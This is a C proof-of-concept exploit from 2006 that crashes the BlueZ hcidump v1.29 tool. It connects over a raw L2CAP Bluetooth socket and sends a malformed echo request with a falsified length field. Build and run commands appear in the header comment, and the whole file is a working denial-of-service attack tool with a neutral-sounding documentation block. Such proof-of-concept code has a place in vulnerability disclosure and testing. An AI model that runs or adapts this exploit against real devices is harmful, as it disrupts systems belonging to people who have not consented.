/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * @brief Main function to create a Bluetooth L2CAP socket, bind and connect it to 
 *        a specified Bluetooth address, and send an L2CAP echo request packet.
 *
 * This function performs the following steps:
 * - Parses command-line arguments to get the Bluetooth address.
 * - Creates a Bluetooth socket with the L2CAP protocol.
 * - Initializes a sockaddr_l2 structure and binds the socket to it.
 * - Converts the provided Bluetooth address from string format to binary.
 * - Connects the socket to the specified Bluetooth address.
 * - Allocates a buffer for the packet, constructs the L2CAP echo request packet,
 *   and sends it over the socket.
 * - Prints the sent L2CAP packet in hexadecimal format.
 * - Frees the allocated buffer and closes the socket before exiting.
 *
 * @param[in] argc Number of command-line arguments.
 * @param[in] argv Array of command-line argument strings.
 * @return int Returns EXIT_SUCCESS on successful execution, EXIT_FAILURE otherwise.
 */
int main(int argc, char **argv)
{
    char *packetBuffer;
    l2cap_cmd_hdr *cmdHeader;	
    struct sockaddr_l2 socketAddress;
    int socketFd, bytesSent, index;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    if ((socketFd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&socketAddress, 0, sizeof(socketAddress));
    socketAddress.l2_family = AF_BLUETOOTH;

    if (bind(socketFd, (struct sockaddr *) &socketAddress, sizeof(socketAddress)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &socketAddress.l2_bdaddr);
    
    if (connect(socketFd, (struct sockaddr *) &socketAddress, sizeof(socketAddress)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    if(!(packetBuffer = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    
    memset(packetBuffer, 'A', SIZE);

    cmdHeader = (l2cap_cmd_hdr *) packetBuffer;
    cmdHeader->code = L2CAP_ECHO_REQ;
    cmdHeader->ident = 1;
    cmdHeader->len = FAKE_SIZE;
    
    if( (bytesSent = send(socketFd, packetBuffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", bytesSent);
    }

    printf("Buffer:\t");
    for(index = 0; index < bytesSent; index++)
    {
        printf("%.2X ", (unsigned char) packetBuffer[index]);
    }
    printf("\n");

    free(packetBuffer);
    close(socketFd);
    return EXIT_SUCCESS;
}
